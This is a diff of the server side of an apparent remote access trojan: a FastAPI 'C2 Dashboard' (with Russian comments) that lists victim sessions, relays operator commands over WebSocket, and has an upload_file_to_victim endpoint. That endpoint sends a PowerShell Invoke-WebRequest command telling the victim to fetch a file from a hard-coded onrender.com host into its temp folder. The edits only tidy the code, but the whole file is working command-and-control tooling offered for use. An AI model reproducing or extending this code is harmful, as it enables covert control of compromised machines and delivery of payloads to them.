@@ -1,7 +1,7 @@
 import os
 import time
 from fastapi import FastAPI, WebSocket, UploadFile, File
-from fastapi.staticfiles import StaticFiles
+from fastapi.responses import HTMLResponse, JSONResponse
 from pydantic import BaseModel
 from typing import Dict
 
@@ -14,10 +14,10 @@ class Command(BaseModel):
     session_id: str
     command: str
 
-@app.get("/", response_class=str)
+@app.get("/")
 async def dashboard():
     """Возвращает HTML-интерфейс управления"""
-    return """
+    html_content = """
     <!DOCTYPE html>
     <html lang="ru">
     <head>
@@ -25,8 +25,6 @@ async def dashboard():
         <title>C2 Dashboard</title>
         <style>
             body { background: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
-            
-            /* Сайдбар со списком устройств */
             .sidebar { width: 250px; background: #1e293b; border-right: 1px solid #334155; display: flex; flex-direction: column; }
             .header { padding: 15px; background: #334155; font-weight: bold; text-align: center; letter-spacing: 1px; }
             .device-list { flex-grow: 1; overflow-y: auto; padding: 10px; }
@@ -38,8 +36,6 @@ async def dashboard():
             .device-item:hover { background: #334155; }
             .device-item.active { background: #2563eb; border-color: #60a5fa; color: white; }
             .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 5px #22c55e; }
-            
-            /* Основная область */
             .main { flex-grow: 1; display: flex; flex-direction: column; padding: 20px; }
             .top-bar { display: flex; justify-content: space-between; margin-bottom: 10px; }
             .console-area { 
@@ -52,8 +48,6 @@ async def dashboard():
             button { padding: 0 15px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; }
             .btn-send { background: #22c55e; color: black; }
             .btn-upload { background: #3b82f6; color: white; }
-            
-            /* Логи */
             .log-line { margin: 2px 0; word-break: break-all; border-bottom: 1px solid #1e293b; padding: 2px; }
             .cmd { color: #60a5fa; }
             .out { color: #e2e8f0; }
@@ -111,7 +105,6 @@ async def dashboard():
 
             function connectWS(sessionId) {
                 if (ws) ws.close();
-                // Определяем протокол (wss для https, ws для http)
                 const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
                 const host = window.location.host;
                 
@@ -121,7 +114,7 @@ async def dashboard():
                     log(`Connected to ${sessionId}`, 'sys');
                     currentSessionId = sessionId;
                     document.getElementById('currentSession').innerText = sessionId;
-                    refreshSessions(); // Обновляем подсветку
+                    refreshSessions();
                 };
                 
                 ws.onmessage = (event) => {
@@ -177,13 +170,13 @@ async def dashboard():
                     .then(updateDevices);
             }
 
-            // Автообновление списка каждые 5 секунд
             setInterval(refreshSessions, 5000);
             refreshSessions();
         </script>
     </body>
     </html>
     """
+    return HTMLResponse(content=html_content)
 
 @app.websocket("/ws/{session_id}")
 async def websocket_endpoint(websocket: WebSocket, session_id: str):
@@ -193,7 +186,6 @@ async def websocket_endpoint(websocket: WebSocket, session_id: str):
     
     try:
         while True:
-            # Ждем сообщения от клиента (если нужно)
             data = await websocket.receive_text()
     except Exception:
         pass
@@ -218,19 +210,15 @@ async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
     if session_id not in sessions:
         return {"status": "error", "message": "Session not found"}
     
-    # Сохраняем файл локально на сервере
     file_path = os.path.join("uploads", file.filename)
     os.makedirs("uploads", exist_ok=True)
     with open(file_path, "wb") as buffer:
         buffer.write(await file.read())
         
-    # Формируем URL для скачивания жертвой
-    # Важно: victim должен иметь доступ к этому файлу по HTTP
-    download_url = f"https://{app.state.app_host or 'localhost'}:8000/uploads/{file.filename}"
+    download_url = f"https://ratochka.onrender.com/uploads/{file.filename}"
     
     ws = sessions[session_id].get("ws")
     if ws:
-        # Команда для Windows PowerShell: скачать файл во временную папку
         cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
         await ws.send_text(f"FILE_CMD:{cmd}")
         return {"status": "ok", "message": f"Command sent to download {file.filename}"}
@@ -243,6 +231,4 @@ async def get_sessions():
 
 if __name__ == "__main__":
     import uvicorn
-    # Указываем хост для генерации ссылок
-    app.state.app_host = "ratochka.onrender.com"
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
